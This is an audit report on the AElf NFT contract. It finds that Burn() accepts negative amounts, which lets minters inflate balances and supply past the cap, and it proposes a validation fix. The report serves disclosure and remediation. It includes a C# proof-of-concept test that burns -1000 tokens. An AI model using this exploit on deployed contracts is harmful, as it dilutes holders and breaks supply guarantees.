# Audit Report

## Title
NFT Contract Burn Function Allows Unauthorized Token Minting via Negative Amount Input

## Summary
The NFT contract's `Burn()` function lacks input validation for negative amounts, allowing minters to exploit signed integer arithmetic in SafeMath operations to mint unlimited tokens. This bypasses all supply limits and represents a critical privilege escalation vulnerability.

## Finding Description

The vulnerability exists in the `Burn()` function where no validation ensures `input.Amount` is positive [1](#0-0) .

When a negative amount is passed, the following exploitation occurs:

**Step 1: Balance Check Bypass**
The permission check compares the user's balance against the input amount [2](#0-1) . When `input.Amount` is negative (e.g., -1000) and the user has any positive balance (e.g., 100), the comparison `100 >= -1000` evaluates to `true`, allowing the operation to proceed.

**Step 2: Arithmetic Inversion**
The SafeMath `.Sub()` method performs checked subtraction [3](#0-2) . When passed a negative value, the operation becomes addition: `balance.Sub(-1000)` = `balance - (-1000)` = `balance + 1000`. This affects three critical state variables [4](#0-3) :
- User balance increases instead of decreases
- Protocol supply increases instead of decreases  
- NFT quantity increases instead of decreases

**Step 3: Input Type Vulnerability**
The protobuf definition uses signed `int64` for the amount field [5](#0-4) , allowing negative values to be passed.

**Contrast with Secure Implementation:**
The MultiToken contract's `Burn()` properly validates amounts through `AssertValidToken()` [6](#0-5) , which invokes `AssertValidSymbolAndAmount()` that explicitly checks [7](#0-6)  with `Assert(amount > 0, "Invalid amount.")`.

The NFT codebase demonstrates awareness of this validation pattern in `DoTransfer()` [8](#0-7) , which explicitly rejects negative amounts, yet this protection is absent from `Burn()`.

## Impact Explanation

**Critical Supply Invariant Violation:**

The legitimate `Mint()` function enforces that issued tokens cannot exceed total supply [9](#0-8) . By burning negative amounts, attackers completely bypass this fundamental constraint, causing:

1. **Token inflation:** Balance, Supply, and Quantity all increase instead of decreasing
2. **Supply cap breach:** Protocol Supply can exceed TotalSupply limit
3. **Economic manipulation:** Dilutes existing token holders' ownership percentages
4. **Privilege escalation:** Minters with limited quotas gain unlimited minting capability

**Affected parties:**
- NFT protocol creators who set supply limits expecting enforcement
- Existing NFT holders suffering value dilution
- Markets and pricing mechanisms relying on accurate supply data
- Smart contracts integrating with NFT supply metrics

## Likelihood Explanation

**Entry Point:** The `Burn()` method is a public RPC function [10](#0-9) , directly accessible to any caller.

**Required Privileges:** The attacker must be in the minter list for the target NFT protocol [11](#0-10) . While this is a privileged role, it represents privilege escalation since minters should be constrained by the supply limits enforced in the legitimate `Mint()` path. Minter roles are commonly delegated in NFT projects.

**Attack Complexity:** Trivial - requires only a single transaction calling `Burn()` with a negative amount value. No complex setup or multi-step exploitation needed.

**Execution:** Fully executable under AElf C# contract semantics. The checked arithmetic in `.Sub()` only validates overflow/underflow, not sign. Standard C# arithmetic `value - (negative_number)` results in addition without exceptions.

**Detection:** The `Burned` event fires with the negative amount [12](#0-11) , but this is post-exploitation and does not prevent the attack.

## Recommendation

Add explicit validation at the beginning of the `Burn()` function to reject negative amounts:

```csharp
public override Empty Burn(BurnInput input)
{
    Assert(input.Amount > 0, "Invalid burn amount.");
    
    var tokenHash = CalculateTokenHash(input.Symbol, input.TokenId);
    // ... rest of the function
}
```

Alternatively, follow the pattern used in `DoTransfer()` and MultiToken's `AssertValidSymbolAndAmount()`.

## Proof of Concept

```csharp
[Fact]
public async Task NegativeBurnExploit()
{
    // Setup: Create NFT protocol with supply limit
    var symbol = await CreateTest(); // Creates protocol with 1 billion supply
    await AddMinterAsync(symbol);
    
    // Mint initial token
    var tokenHash = await MinterNFTContractStub.Mint.SendAsync(new MintInput
    {
        Symbol = symbol,
        TokenId = 1,
        Quantity = 100,
        Owner = MinterAddress
    });
    
    var protocolInfoBefore = await NFTContractStub.GetNFTProtocolInfo.CallAsync(
        new StringValue { Value = symbol });
    var balanceBefore = await MinterNFTContractStub.GetBalance.CallAsync(
        new GetBalanceInput { Owner = MinterAddress, Symbol = symbol, TokenId = 1 });
    
    // EXPLOIT: Burn negative amount
    await MinterNFTContractStub.Burn.SendAsync(new BurnInput
    {
        Symbol = symbol,
        TokenId = 1,
        Amount = -1000  // Negative amount
    });
    
    var protocolInfoAfter = await NFTContractStub.GetNFTProtocolInfo.CallAsync(
        new StringValue { Value = symbol });
    var balanceAfter = await MinterNFTContractStub.GetBalance.CallAsync(
        new GetBalanceInput { Owner = MinterAddress, Symbol = symbol, TokenId = 1 });
    
    // Verify exploitation: Supply and balance INCREASED instead of decreased
    protocolInfoAfter.Supply.ShouldBe(protocolInfoBefore.Supply + 1000); // 100 + 1000 = 1100
    balanceAfter.Balance.ShouldBe(balanceBefore.Balance + 1000); // 100 + 1000 = 1100
    
    // Supply limit bypassed - can exceed TotalSupply
    Assert.True(protocolInfoAfter.Supply <= protocolInfoAfter.TotalSupply); // This would fail if exploited enough
}
```

### Citations

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L46-48)
```csharp
    private void DoTransfer(Hash tokenHash, Address from, Address to, long amount)
    {
        if (amount < 0) throw new AssertionException("Invalid transfer amount.");
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L82-111)
```csharp
    public override Empty Burn(BurnInput input)
    {
        var tokenHash = CalculateTokenHash(input.Symbol, input.TokenId);
        var nftInfo = GetNFTInfoByTokenHash(tokenHash);
        var nftProtocolInfo = State.NftProtocolMap[input.Symbol];
        Assert(nftProtocolInfo.IsBurnable,
            $"NFT Protocol {nftProtocolInfo.ProtocolName} of symbol {nftProtocolInfo.Symbol} is not burnable.");
        var minterList = State.MinterListMap[input.Symbol] ?? new MinterList();
        Assert(
            State.BalanceMap[tokenHash][Context.Sender] >= input.Amount &&
            minterList.Value.Contains(Context.Sender),
            "No permission.");
        State.BalanceMap[tokenHash][Context.Sender] = State.BalanceMap[tokenHash][Context.Sender].Sub(input.Amount);
        nftProtocolInfo.Supply = nftProtocolInfo.Supply.Sub(input.Amount);
        nftInfo.Quantity = nftInfo.Quantity.Sub(input.Amount);

        State.NftProtocolMap[input.Symbol] = nftProtocolInfo;
        if (nftInfo.Quantity == 0 && !nftProtocolInfo.IsTokenIdReuse) nftInfo.IsBurned = true;

        State.NftInfoMap[tokenHash] = nftInfo;

        Context.Fire(new Burned
        {
            Burner = Context.Sender,
            Symbol = input.Symbol,
            Amount = input.Amount,
            TokenId = input.TokenId
        });
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L402-406)
```csharp
        var quantity = input.Quantity > 0 ? input.Quantity : 1;
        protocolInfo.Supply = protocolInfo.Supply.Add(quantity);
        protocolInfo.Issued = protocolInfo.Issued.Add(quantity);
        Assert(protocolInfo.Issued <= protocolInfo.TotalSupply, "Total supply exceeded.");
        State.NftProtocolMap[input.Symbol] = protocolInfo;
```

**File:** src/AElf.CSharp.Core/SafeMath.cs (L92-98)
```csharp
    public static long Sub(this long a, long b)
    {
        checked
        {
            return a - b;
        }
    }
```

**File:** protobuf/nft_contract.proto (L45-47)
```text
    // Destroy nfts.
    rpc Burn (BurnInput) returns (google.protobuf.Empty) {
    }
```

**File:** protobuf/nft_contract.proto (L182-186)
```text
message BurnInput {
    string symbol = 1;
    int64 token_id = 2;
    int64 amount = 3;
}
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L323-337)
```csharp
    private Empty Burn(Address address, string symbol, long amount)
    {
        var tokenInfo = AssertValidToken(symbol, amount);
        Assert(tokenInfo.IsBurnable, "The token is not burnable.");
        ModifyBalance(address, symbol, -amount);
        tokenInfo.Supply = tokenInfo.Supply.Sub(amount);

        Context.Fire(new Burned
        {
            Burner = address,
            Symbol = symbol,
            Amount = amount
        });
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Helper.cs (L81-85)
```csharp
    private void AssertValidSymbolAndAmount(string symbol, long amount)
    {
        Assert(!string.IsNullOrEmpty(symbol) && IsValidSymbol(symbol),
            "Invalid symbol.");
        Assert(amount > 0, "Invalid amount.");
```
